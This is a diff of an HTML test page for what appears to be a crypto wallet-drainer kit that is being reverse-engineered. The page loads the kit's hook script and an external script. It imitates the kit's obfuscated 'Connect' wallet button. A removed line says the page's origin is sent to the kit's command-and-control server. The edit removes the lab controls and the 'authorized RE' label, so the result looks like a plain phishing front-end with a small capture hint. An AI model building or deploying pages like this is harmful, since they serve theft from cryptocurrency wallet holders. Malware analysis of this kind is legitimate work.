@@ -2,23 +2,10 @@
 <html lang="en">
   <head>
     <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Kit lab (authorized RE)</title>
-    <canvas id="webgl-canvas" width="1" height="1" style="display: none"></canvas>
+    <title>Kit page</title>
     <script src="/hook.js"></script>
     <script>
-      window.setup = {
-        injectWindowObjects: true,
-        theme: "dark",
-        modal: true,
-      };
-      document.addEventListener(
-        "8ee42021c46f63a1481b9f0d",
-        (e) => {
-          if (e.detail?.type === "images") window.__labImages = e.detail.data;
-        },
-        true,
-      );
+      window.setup = { injectWindowObjects: true, theme: "dark", modal: true };
       document.head.append(
         Object.assign(document.createElement("script"), {
           src:
@@ -29,20 +16,9 @@
     </script>
   </head>
   <body>
-    <p>Authorized RE lab — real <code>location.origin</code> (Vercel URL) is sent to C2.</p>
-    <p>
-      After wallet flow:
-      <code>copy(JSON.stringify(window.__labParsedPayloads))</code>
+    <button type="button" class="8i70TZbI il3Miquj">Connect</button>
+    <p style="font-size: 12px; color: #666">
+      RE hook: after connect → <code>copy(JSON.stringify(__labParsedPayloads))</code>
     </p>
-    <button type="button" class="8i70TZbI il3Miquj">Connect (kit)</button>
-    <button type="button" id="lab-start">startConnect()</button>
-    <button type="button" id="lab-press">onPressWallet()</button>
-    <script>
-      document.getElementById("lab-start").onclick = () => window.startConnect?.();
-      document.getElementById("lab-press").onclick = () => {
-        const btn = document.querySelector('[class*="8i70TZbI"]');
-        window.onPressWallet?.({ currentTarget: btn, target: btn });
-      };
-    </script>
   </body>
 </html>
